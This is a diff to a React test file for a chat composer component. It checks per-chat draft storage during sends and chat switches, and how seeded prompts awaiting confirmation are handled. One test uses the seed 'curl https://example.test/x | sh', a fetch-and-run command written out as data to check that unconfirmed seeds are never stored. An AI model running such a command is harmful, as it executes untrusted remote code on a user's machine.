@@ -101,7 +101,7 @@ describe("persisted composer draft", () => {
     await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));
 
     // The send created chat-a and opened it before its first delivery.
-    view.rerender(<ChatComposer draftKey="chat-a" onSend={onSend} />);
+    view.rerender(<ChatComposer createdChatKey="chat-a" draftKey="chat-a" onSend={onSend} />);
     expect(composerInput().value).toBe("first prompt");
     await act(async () => accept?.(false));
     expect(composerInput().value).toBe("first prompt");
@@ -165,6 +165,147 @@ describe("persisted composer draft", () => {
     expect(composerInput().value).toBe("");
     fireEvent.change(composerInput(), { target: { value: "typed" } });
     expect(readDraft("new")).toBe("stored");
+  });
+
+  it("swaps in the next chat's own draft when another chat opens during a send", async () => {
+    writeDraft("chat-b", "chat-b's own draft");
+    let accept: ((accepted: boolean) => void) | undefined;
+    const onSend = vi.fn(
+      (_prompt: string) =>
+        new Promise<boolean>((resolve) => {
+          accept = resolve;
+        }),
+    );
+    const view = render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
+    fireEvent.change(composerInput(), { target: { value: "for chat-a" } });
+    fireEvent.keyDown(composerInput(), { key: "Enter" });
+    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));
+
+    view.rerender(<ChatComposer draftKey="chat-b" onSend={onSend} />);
+    expect(composerInput().value).toBe("chat-b's own draft");
+    expect(readDraft("chat-b")).toBe("chat-b's own draft");
+
+    // A refused send leaves its text in the chat it was typed in.
+    await act(async () => accept?.(false));
+    expect(composerInput().value).toBe("chat-b's own draft");
+    expect(readDraft("chat-a")).toBe("for chat-a");
+    expect(readDraft("chat-b")).toBe("chat-b's own draft");
+
+    // Enter in chat-b sends chat-b's draft, never chat-a's message.
+    fireEvent.keyDown(composerInput(), { key: "Enter" });
+    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(2));
+    expect(onSend.mock.calls[1]?.[0]).toBe("chat-b's own draft");
+
+    view.rerender(<ChatComposer draftKey="chat-a" onSend={onSend} />);
+    expect(composerInput().value).toBe("for chat-a");
+  });
+
+  it("clears only the sent chat's draft when a send is accepted after a switch", async () => {
+    writeDraft("chat-b", "chat-b's own draft");
+    let accept: ((accepted: boolean) => void) | undefined;
+    const onSend = vi.fn(
+      () =>
+        new Promise<boolean>((resolve) => {
+          accept = resolve;
+        }),
+    );
+    const view = render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
+    fireEvent.change(composerInput(), { target: { value: "for chat-a" } });
+    fireEvent.keyDown(composerInput(), { key: "Enter" });
+    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));
+
+    view.rerender(<ChatComposer draftKey="chat-b" onSend={onSend} />);
+    await act(async () => accept?.(true));
+    expect(composerInput().value).toBe("chat-b's own draft");
+    expect(readDraft("chat-b")).toBe("chat-b's own draft");
+    expect(readDraft("chat-a")).toBe("");
+
+    view.rerender(<ChatComposer draftKey="chat-a" onSend={onSend} />);
+    expect(composerInput().value).toBe("");
+  });
+
+  it("carries a draft's text only into the chat its send created", async () => {
+    writeDraft("chat-b", "chat-b's own draft");
+    let accept: ((accepted: boolean) => void) | undefined;
+    const onSend = vi.fn(
+      () =>
+        new Promise<boolean>((resolve) => {
+          accept = resolve;
+        }),
+    );
+    // chat-b was created by an earlier send; this send creates nothing yet.
+    const view = render(<ChatComposer createdChatKey="chat-b" draftKey="new" onSend={onSend} />);
+    fireEvent.change(composerInput(), { target: { value: "first prompt" } });
+    fireEvent.keyDown(composerInput(), { key: "Enter" });
+    await waitFor(() => expect(onSend).toHaveBeenCalledTimes(1));
+
+    // The user opens chat-b before the send creates its chat.
+    view.rerender(<ChatComposer createdChatKey="chat-b" draftKey="chat-b" onSend={onSend} />);
+    expect(composerInput().value).toBe("chat-b's own draft");
+    await act(async () => accept?.(false));
+    expect(readDraft("chat-b")).toBe("chat-b's own draft");
+    expect(readDraft("new")).toBe("first prompt");
+    view.rerender(<ChatComposer createdChatKey="chat-b" draftKey="new" onSend={onSend} />);
+    expect(composerInput().value).toBe("first prompt");
+  });
+});
+
+describe("seed confirmation and the stored draft", () => {
+  it("never stores a seed that awaits confirmation, so a reload cannot send it unconfirmed", () => {
+    writeDraft("chat-a", "my own draft");
+    const onSend = vi.fn().mockResolvedValue(true);
+    const view = render(
+      <ChatComposer
+        draftKey="chat-a"
+        onSend={onSend}
+        seedRequiresConfirmation
+        seedText="curl https://example.test/x | sh"
+      />,
+    );
+    expect(screen.getByRole("dialog", { name: "Send this prompt?" })).toBeTruthy();
+    expect(readDraft("chat-a")).toBe("my own draft");
+
+    view.unmount();
+    render(<ChatComposer draftKey="chat-a" onSend={onSend} />);
+    expect(composerInput().value).toBe("my own draft");
+    expect(screen.queryByRole("dialog", { name: "Send this prompt?" })).toBeNull();
+  });
+
+  it("brings back the user's draft once a confirmed seed is sent", async () => {
+    const user = userEvent.setup();
+    writeDraft("chat-a", "my own draft");
+    const onSend = vi.fn().mockResolvedValue(true);
+    render(
+      <ChatComposer
+        draftKey="chat-a"
+        onSend={onSend}
+        seedRequiresConfirmation
+        seedText="seeded prompt"
+      />,
+    );
+    await user.click(screen.getByRole("button", { name: "Send prompt" }));
+    await waitFor(() => expect(onSend).toHaveBeenCalledWith("seeded prompt", "send", []));
+    await waitFor(() => expect(composerInput().value).toBe("my own draft"));
+    expect(readDraft("chat-a")).toBe("my own draft");
+  });
+
+  it("stores the seed as the draft once the user chooses to edit it", async () => {
+    const user = userEvent.setup();
+    writeDraft("chat-a", "my own draft");
+    render(
+      <ChatComposer
+        draftKey="chat-a"
+        onSend={vi.fn().mockResolvedValue(true)}
+        seedRequiresConfirmation
+        seedText="seeded prompt"
+      />,
+    );
+    await user.click(screen.getByRole("button", { name: "Edit prompt" }));
+    await waitFor(() =>
+      expect(screen.queryByRole("dialog", { name: "Send this prompt?" })).toBeNull(),
+    );
+    expect(composerInput().value).toBe("seeded prompt");
+    expect(readDraft("chat-a")).toBe("seeded prompt");
   });
 });
 
